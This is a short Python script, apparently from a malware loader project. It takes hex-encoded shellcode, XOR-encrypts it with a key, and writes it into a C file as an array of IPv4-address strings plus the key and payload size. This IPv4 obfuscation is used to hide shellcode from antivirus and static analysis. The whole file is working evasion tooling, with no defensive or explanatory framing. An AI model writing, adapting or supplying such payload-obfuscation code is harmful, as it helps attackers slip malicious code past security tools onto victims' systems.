import sys
import os

if len(sys.argv) < 2:
    print("Usage: hex_to_ipv4.py <input.txt> [key=0xAA]")
    sys.exit(1)
output = ""
input_file = sys.argv[1]
key = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0xAA

with open(input_file, "r") as f:
    hex_string = f.read().strip()

shellcode = bytes.fromhex(hex_string)
original_size = len(shellcode)

encrypted = bytearray()
for b in shellcode:
    encrypted.append(b ^ key)
while len(encrypted) % 4 != 0:
    encrypted.append(0x00)

script_dir = os.path.dirname(os.path.abspath(__file__))
output_file = os.path.normpath(os.path.join(script_dir, "..", "src", "payload.c"))

lines = ["const char* Payload[] = {"]
for i in range(0, len(encrypted), 4):
    c = encrypted[i:i+4]
    lines.append(f'    "{c[0]}.{c[1]}.{c[2]}.{c[3]}",')
lines.append("};")
ipv4_array = "\n".join(lines)



output += '#include "payload.h"\n\n'
output += ipv4_array + "\n\n"
output += "const unsigned int payloadSize = sizeof(Payload) / sizeof(Payload[0]);\n"
output += f"unsigned char xorKey = {key};" 

with open(output_file, "w") as f:
    f.write(output)
